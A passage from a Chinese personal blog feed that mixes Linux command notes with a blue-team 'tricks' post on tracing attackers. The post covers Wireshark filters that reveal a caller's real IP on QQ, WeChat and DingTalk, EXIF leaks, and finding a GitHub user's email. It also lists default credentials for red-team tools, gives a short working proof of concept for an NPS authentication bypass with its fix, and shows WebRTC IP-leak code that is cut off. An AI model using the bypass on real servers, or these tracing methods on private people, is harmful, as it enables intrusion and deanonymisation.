class="code"><pre><span class="line">init 3 or 5//图形化纯命令行界面切换</span><br><span class="line">init 0 //关机 init 6//重启</span><br><span class="line">runlevel</span><br><span class="line">startx //无需登录切换</span><br><span class="line"><span class="built_in">tty</span> //终端号</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> -u //查看当前用户<span class="built_in">id</span>，0为管理员</span><br><span class="line"><span class="built_in">uname</span> -r //内核版本</span><br><span class="line">lscpu //cpu型号</span><br><span class="line">free -h //空闲内存</span><br><span class="line"><span class="built_in">cat</span> /proc/meminfo //空闲内存</span><br><span class="line">lsblk //硬盘大小</span><br><span class="line">mii-tool ens33 //查看网卡信息</span><br><span class="line"><span class="built_in">cat</span> /etc/shells //查看全部shell</span><br><span class="line">hostname //主机名</span><br><span class="line"><span class="built_in">enable</span> cmd //启用内部命令，内部命令优先级高于外部</span><br><span class="line"><span class="built_in">enable</span> -n cmd //禁用内部命令</span><br></pre></td></tr></table></figure><p> 命令执行过程：外部命令先根据$PATH找存储位置，而后放入hash表缓存，下次使用直接从hash表找路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash //缓存</span><br><span class="line">hash -d name //清除name缓存</span><br><span class="line">hash -l //可看到别名</span><br><span class="line">hash -p path name //起别名</span><br><span class="line">hash -t name//显示路径</span><br><span class="line">hash -r//清除缓存</span><br></pre></td></tr></table></figure><hr><h4 id="Linux文件管理"><a href="#Linux文件管理" class="headerlink" title="Linux文件管理"></a>Linux文件管理</h4><h5 id="Linux-系统目录结构FHS"><a href="#Linux-系统目录结构FHS" class="headerlink" title="Linux 系统目录结构FHS"></a>Linux 系统目录结构FHS</h5><p>​    FHS 全称（Filesystem Hieratchy Standard）中文名文件系统结构层次，定义了Linux操作系统中的主要目录和目录结构。</p><table><thead><tr><th align="left">目录</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">/</td><td align="left">根目录</td></tr><tr><td align="left">/bin</td><td align="left">放置可执行文件，如ls命令等</td></tr><tr><td align="left">/boot</td><td align="left">引导程序文件，内核，以及 initrd 等文件</td></tr><tr><td align="left">/dev</td><td align="left">设备文件，比如磁盘设备</td></tr><tr><td align="left">/etc</td><td align="left">系统范围的配置文件</td></tr><tr><td align="left">/home</td><td align="left">用户 home 目录，个人用户的配置</td></tr><tr><td align="left">/media</td><td align="left">可移除的媒体，cd-rom 等的挂载点</td></tr><tr><td align="left">/lib 和 /lib64</td><td align="left">/bin 和 /sbin 中用到的库文件存放位置</td></tr><tr><td align="left">/mnt</td><td align="left">临时挂载点，U盘等</td></tr><tr><td align="left">/opt</td><td align="left">可选的应用包，一般用于存放一些直接提供二进制程序的非开源包</td></tr><tr><td align="left">/proc</td><td align="left">虚拟文件系统</td></tr><tr><td align="left">/root</td><td align="left">root 用户的 home 目录</td></tr><tr><td align="left">/run</td><td align="left">存放一些 pid 和 socket 文件</td></tr><tr><td align="left">/sbin</td><td align="left">系统的可执行文件，init ，mount 等</td></tr><tr><td align="left">/sys</td><td align="left">非FHS标准，但是大部分发行版都有，虚拟文件系统，用来对内核和设备驱动做设置</td></tr><tr><td align="left">/usr</td><td align="left">Unix Software Resource 绝大多数的程序和应用工具安装在这里，结果和/非常相似</td></tr><tr><td align="left">/usr/bin</td><td align="left">对应的可执行文件</td></tr><tr><td align="left">/usr/lib</td><td align="left">对应的库文件</td></tr><tr><td align="left">/usr/share</td><td align="left">和计算机无关的共享资源文件</td></tr><tr><td align="left">/usr/src</td><td align="left">源代码存放路径，如Linux 内核源码</td></tr><tr><td align="left">/var</td><td align="left">在程序运行中内容不断变化的文件，比如日志</td></tr><tr><td align="left">/tmp</td><td align="left">临时文件系统，重启后内容丢失</td></tr></tbody></table><h5 id="服务管理方式"><a href="#服务管理方式" class="headerlink" title="服务管理方式"></a>服务管理方式</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>systemctl status crond</td><td>查看某个服务的状态</td></tr><tr><td>systemctl start crond</td><td>启动某个服务</td></tr><tr><td>systemctl stop crond</td><td>停止某个服务</td></tr><tr><td>systemctl enable crond</td><td>设置某个服务开机启动</td></tr><tr><td>systemctl disable crond</td><td>移除某个服务开机启动</td></tr><tr><td>systemctl restart crond</td><td>重启某个服务</td></tr></tbody></table><h5 id="日志与日志管理方式"><a href="#日志与日志管理方式" class="headerlink" title="日志与日志管理方式"></a>日志与日志管理方式</h5><p>​    日志是由程序在运行过程中打印出来的一些执行流程或者记录信息的文本，Systemd 同样也提供了对日志访问的方式</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>journalctl -x</td><td>查看日志</td></tr><tr><td>journalctl -xe</td><td>跳到尾部查看日志</td></tr><tr><td>journalctl -u crond.service</td><td>查看crond服务的日志</td></tr></tbody></table><p>​    通过直接查看文本的方式查询</p><table><thead><tr><th>日志路径</th><th>说明</th></tr></thead><tbody><tr><td>/var/log/message</td><td>全局系统日志，包括登录，对服务启停认证等</td></tr><tr><td>/var/log/lastlog</td><td>不是一个文本文件，需要 lastlog 命令读，保存了最近的用户登录信息</td></tr><tr><td>/var/log/yum.log</td><td>最近通过yum 安装的程序的日志</td></tr><tr><td>/var/log/cron</td><td>定时任务日志</td></tr><tr><td>/var/log/boot.log</td><td>启动日志</td></tr><tr><td>/var/log/kern</td><td>内核日志，也可以通过 dmesg 查看</td></tr></tbody></table><hr><h4 id="Linux磁盘管理"><a href="#Linux磁盘管理" class="headerlink" title="Linux磁盘管理"></a>Linux磁盘管理</h4><h5 id="磁盘结构和概念"><a href="#磁盘结构和概念" class="headerlink" title="磁盘结构和概念"></a>磁盘结构和概念</h5><h6 id="设备文件"><a href="#设备文件" class="headerlink" title="设备文件"></a>设备文件</h6><p>​    设备在Linux内有很多文件，不同文件的开头各有不同，对应的设备也不同。</p><p>l/O Ports: I/O设备地址</p><p>​    一切皆文件：open(), read(), write(), close()</p><h6 id="设备类型"><a href="#设备类型" class="headerlink" title="设备类型"></a>设备类型</h6><p>​    块设备：block，存取单位“块”,磁盘（通常具有缓存，而且是随机的；大部分表现为物理上看的见的设备；）</p><p>​    字符设备：char，存取单位 “字符”，键盘（具有一定的顺序；大部分表现为逻辑上的设备例如：null、zero、tty）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74333.jpg"                      alt="image-20220513152636491"                ></p><p>​    上述两个设备存放的不是大小，而是两个数字；前者是设备的主要编号（类别），后者是设备的次要编号（序号）。</p><p>​    设备文件：关联至一个设备驱动程序，进而能够跟与之对应硬件设备进行通信。</p><p>​    主设备号：major number,标识设备类型</p><p>​    次设备号：minor number,标识同一类型下的不同设备</p><p>​    当设备名对应的主要编号和次要编号相同时，那么代表的是同一个设备。</p><p>​    设备的名称可人为指定。操作：（cp -a /dev/null）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074334.jpg"                      alt="image-20220513153742841"                ></p><hr><h4 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> <span class="built_in">test</span>=“xxx”//别名</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PATH</span>&quot;</span>//弱引用变量会替换</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$PATh&#x27;</span>//强引用变量不会替换</span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">ls</span>`//执行命令</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    本系列为个人基础知识补全以及为后续方便查找开设，里面会包括由于Linux基础知识的相关内容…&lt;/p&gt;
&lt;h4 id=&quot;系统调用过程&quot;&gt;&lt;a href=&quot;#系统调用过程&quot; class=&quot;headerlink&quot; title=&quot;系统调用过程&quot;&gt;&lt;/a&gt;系统调用过程&lt;/h</summary>
      
    
    
    
    <category term="Linux学习基础篇" scheme="http://example.com/categories/Linux%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="运维" scheme="http://example.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>没用的小技巧(BLUE)</title>
    <link href="http://example.com/2022/03/23/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-BLUE/"/>
    <id>http://example.com/2022/03/23/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-BLUE/</id>
    <published>2022-03-23T14:07:26.000Z</published>
    <updated>2023-04-15T07:44:20.616Z</updated>
    
    <content type="html"><![CDATA[<h3 id="QQ电话真实IP"><a href="#QQ电话真实IP" class="headerlink" title="QQ电话真实IP"></a>QQ电话真实IP</h3><p>​    溯源或者鼓捣小玩意时，我们会获取到QQ号，通过QQ电话即可找到对方的真实IP。</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>​    官网下载：<a class="link"   href="https://www.wireshark.org/#download" >wireshark<i class="fas fa-external-link-alt"></i></a></p><p>​    Mac下的是需要安装另一个插件的才可以正常抓包的，安装里有提示。</p><h4 id="QQ"><a href="#QQ" class="headerlink" title="QQ"></a>QQ</h4><p>​    首先需要清楚QQ包的过滤条件020048，这里QQ的UDP包是72字节的包，而020048是包的开头。我对比了下我的包和其他师傅们的包，0200480001都是相同的，但是只匹配020048即可。</p><p>​    UDP包前面是8个字节的，所以根据规则，我们偏移八个字节后再过滤三字节020048即可。udp[8:3]==02:00:48。</p><h5 id="QQ接通"><a href="#QQ接通" class="headerlink" title="QQ接通"></a>QQ接通</h5><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074336.jpg"                      alt="image-20220323224319083"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074340.jpg"                      alt="image-20220323224400594"                ></p><p>​    打码部分即为真实IP。</p><h5 id="QQ未接通"><a href="#QQ未接通" class="headerlink" title="QQ未接通"></a>QQ未接通</h5><p>​    未接通使用上述条件过滤一样可获取真实IP。</p><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074341.jpg"                      alt="image-20220323225253739"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074344.jpg"                      alt="image-20220323225321426"                ></p><h4 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h4><p>​    微信的包是120字节，开头为a3（太短了后面会隔一段时间更新版本后看会不会变化）。所以过滤条件：data.len == 120 &amp;&amp; udp[8:1] == a3</p><h5 id="微信接通"><a href="#微信接通" class="headerlink" title="微信接通"></a>微信接通</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074347.jpg"                      alt="image-20220323230917942"                ></h5><h5 id="微信未接通"><a href="#微信未接通" class="headerlink" title="微信未接通"></a>微信未接通</h5><p>​    拿不到IP</p><p>​    下面的测试方法差不多了</p><h4 id="钉钉："><a href="#钉钉：" class="headerlink" title="钉钉："></a>钉钉：</h4><p>​    udp[8:4]==00:01:00:4c</p><hr><h3 id="照片EXIF信息浅谈"><a href="#照片EXIF信息浅谈" class="headerlink" title="照片EXIF信息浅谈"></a>照片EXIF信息浅谈</h3><p>​    EXIF信息，是可交换图像文件的缩写，是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。EXIF可以附加于JPEG、TIFF、RIFF等文件之中，为其增加有关数码相机拍摄信息的内容和索引图或图像处理软件的版本信息。</p><p>​    查了下以前的新闻，还上过热搜，没什么技术含量，玩一玩，看看现在还能用不。</p><h4 id="微信-1"><a href="#微信-1" class="headerlink" title="微信"></a>微信</h4><p>​    微信收原图保存后本地有三张，一张hd、一张thumb、一张普通pic，thumb和原pic都是压缩的，原图发送的hd的也是没有EXIF信息的。直接从相册导出的图片是包含EXIF信息的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074348.jpg"                      alt="image-20220330154656983"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074350.jpg"                      alt="image-20220330154725877"                ></p><p>​    PS.网上说微信文件传输助手发的不会丢失信息，测试后EXIF信息也已经丢失。</p><h4 id="TIM"><a href="#TIM" class="headerlink" title="TIM"></a>TIM</h4><p>​    无论是发送到人还是使用文件传输助手均丢失信息。</p><h4 id="QQ-1"><a href="#QQ-1" class="headerlink" title="QQ"></a>QQ</h4><p>​    均丢失</p><h4 id="钉钉"><a href="#钉钉" class="headerlink" title="钉钉"></a>钉钉</h4><p>​    只要发送原图信息，经过格式转换为JPG也不会丢失！</p><p>​    （注意，直接发送相册里的是没有的，因为底下mac上转换格式导出的时候会抹掉位置信息，所以我不确定这一层位置信息抹去是苹果做的还是钉钉做的）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074354.jpg"                      alt="image-20220330174131713"                ></p><h4 id="PS"><a href="#PS" class="headerlink" title="PS."></a>PS.</h4><p>​    Mac下直接从图库里导出照片到桌面，由heic格式转为jpeg格式，苹果会自动去除GPS信息，但是其他信息不会去除。如果直接复制heic格式的到桌面然后改后缀不会去除位置信息。    </p><p>​    根据底下的参考回答，20年5月qq还是会暴露的，现在基本不存在了。G</p><p>​    后续有时间了再看看其他的。</p><hr><h3 id="github用户对应绑定邮箱"><a href="#github用户对应绑定邮箱" class="headerlink" title="github用户对应绑定邮箱"></a>github用户对应绑定邮箱</h3><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>​    1、搜索redteam（只是例子）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074356.jpg"                      alt="image-20220803005031756"                ></p><p>​    2、选择一个历史提交</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074402.jpg"                      alt="image-20220803005214063"                ></p><p>​    3、在url后面，添加.patch 可以查看到用户对应的邮箱</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074404.jpg"                      alt="image-20220803005319393"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074407.jpg"                      alt="image-20220803005423293"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.查看现用邮箱和用户名</span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br><span class="line"></span><br><span class="line">2.使用命令修改git的用户名和提交的邮箱</span><br><span class="line">要修改成的用户名git config  --global user.name 要修改成的用户名</span><br><span class="line">要修改成的邮箱名git config  --global user.email 要修改成的邮箱名</span><br><span class="line"></span><br><span class="line">3.修改已经提交的当前项目的用户名和邮箱名</span><br><span class="line">要修改成的用户名git config user.name 要修改成的用户名</span><br><span class="line">要修改成的邮箱名git config user.email 要修改成的邮箱名</span><br></pre></td></tr></table></figure><hr><h3 id="红队工具检索"><a href="#红队工具检索" class="headerlink" title="红队工具检索"></a>红队工具检索</h3><table><thead><tr><th align="left">工具</th><th align="left">端口</th><th align="left">账号</th><th align="left">密码</th></tr></thead><tbody><tr><td align="left">The Browser Exploitation Framework（BeEF）</td><td align="left">3000</td><td align="left">beef</td><td align="left">beef</td></tr><tr><td align="left">Acunetix Web Vulnerability Scanner(AWVS)</td><td align="left">3443/13443</td><td align="left"><a class="link"   href="mailto:admin@admin.com" >admin@admin.com<i class="fas fa-external-link-alt"></i></a></td><td align="left">Admin123</td></tr><tr><td align="left">ARL（资产侦察灯塔系统）</td><td align="left">5003</td><td align="left">admin</td><td align="left">arlpass</td></tr><tr><td align="left">NPS（内网穿透代理服务器）</td><td align="left">8080</td><td align="left">admin</td><td align="left">123</td></tr><tr><td align="left">nessus</td><td align="left">8834</td><td align="left">自定义</td><td align="left">爆破</td></tr><tr><td align="left">xray反连平台</td><td align="left">8888</td><td align="left">token登录</td><td align="left"></td></tr><tr><td align="left">CobaltStrike（CS）</td><td align="left">50050</td><td align="left">neo</td><td align="left">爆破</td></tr><tr><td align="left">Viper（炫彩蛇）</td><td align="left">60000</td><td align="left">root</td><td align="left">爆破</td></tr></tbody></table><hr><h3 id="nps代理反制"><a href="#nps代理反制" class="headerlink" title="nps代理反制"></a>nps代理反制</h3><p>​    漏洞版本：nps &lt; v0.26.10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">now = time.time()</span><br><span class="line">md5.update(<span class="built_in">str</span>(<span class="built_in">int</span>(now)).encode())</span><br><span class="line">key = md5.hexdigest()</span><br><span class="line">post_data = &#123;<span class="string">&quot;auth_key&quot;</span>: key, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">str</span>(<span class="built_in">int</span>(now))&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8080&quot;</span>, post_data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">now = time.time()</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="built_in">str</span>(<span class="built_in">int</span>(now)).encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">auth_key = m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Index/Index?auth_key=%s&amp;timestamp=%s&quot;</span> % (auth_key,<span class="built_in">int</span>(now)))</span><br></pre></td></tr></table></figure><p>​    只需要在post内容中添加auth_key和timestamp两个参数，分别对应md5(timestamp)和timestamp即可。直接访问生成的url可以看到后台</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074409.jpg"                      alt="image-20220808153129759"                ></p><p>​    auth_key和timestamp的时效只有20s，所以需要不停的生成。并且需要手动添加到get请求和着post请求的参数中。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>​    只需要在配置文件里去掉auth_key的注释，同时注释掉auth_crypt_key。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074412.jpg"                      alt="image-20220808153813718"                ></p><p>​    漏洞分析：</p><p>​    <a class="link"   href="https://blog.zgbsm.online/index.php/2022/08/06/nps-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-0day-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" >https://blog.zgbsm.online/index.php/2022/08/06/nps-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-0day-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/<i class="fas fa-external-link-alt"></i></a></p><hr><h3 id="获取代理池背后真实ip"><a href="#获取代理池背后真实ip" class="headerlink" title="获取代理池背后真实ip"></a>获取代理池背后真实ip</h3><p>​    大部分代理工具以socks5为主，那么对于挂了代理的，好像除了封ip没什么办法。根据师傅们的文章写得办法。注意到WebRTC可以获取背后的真实ip</p><p>​    socks5 协议本身是支持 UDP 协议的，只是大部分的客户端软件/库的作者比较懒，没有实现这部分，遇到之后都直接写个 TODO。那么如果能从浏览器发起一个udp请求的话。那么就有可能获取到真实ip</p><p>​    根据其他师傅的博客文章，发现可以使用 WebRTC发起udp请求。</p><p>​    <strong>通过WEBRTC结合sutn服务器实现获取真实主机IP</strong></p><p>​    WebRTC: Web Real Time Communication 是一系列为提供端到端实时通信连接的协议和 API。Google 于 2011 年发布了基于浏览器的 WebRTC 项目，且这个技术可以使很多不同的应用，如视频会议、文件传输、聊天和桌面共享等都不需要额外的插件。</p><p>​    WebRTC 是完全开源免费的，其使用 RTP 协议来传输音视频，并支持 Chrome、Mozilla、Opera、Microsoft Edge、安卓浏览器等浏览器。</p><p>​    STUN（Simple Traversal of UDP over NATs，NAT 的UDP简单穿越）是一种网络协议，它允许位于NAT（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一 个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT 路由器之后的主机之间建立UDP通信。该协议由RFC 3489定义。</p><p>​    Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的。</p><p>​    github上有这么一个项目：<a class="link"   href="https://github.com/diafygi/webrtc-ips" >https://github.com/diafygi/webrtc-ips<i class="fas fa-external-link-alt"></i></a></p><p>​    然后找到了师傅更改后的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        Remote Addr: &lt;?=$_SERVER[&#x27;REMOTE_ADDR&#x27;]?&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>WebRTC<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Your local IP addresses:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;localip&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Your public IP addresses:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;publicip&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Your IPv6 addresses:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ipv6&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;rtc_iframe&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//get the IP addresses associated with an account</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">getIPs</span>(<span class="params">callback</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> ip_dups = &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//compatibility for firefox and chrome</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> <span class="title class_">RTCPeerConnection</span> = <span class="variable language_">window</span>.<span class="property">RTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                    || <span class="variable language_">window</span>.<span class="property">mozRTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                    || <span class="variable language_">window</span>.<span class="property">msRTCPeerConnection</span></span></span><br><span class="line"><span class="language-javascript">                    || <span class="variable language_">window</span>.<span class="property">webkitRTCPeerConnection</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> useWebKit = !!<span class="variable language_">window</span>.<span class="property">webkitRTCPeerConnection</span>;</span></span><br><span 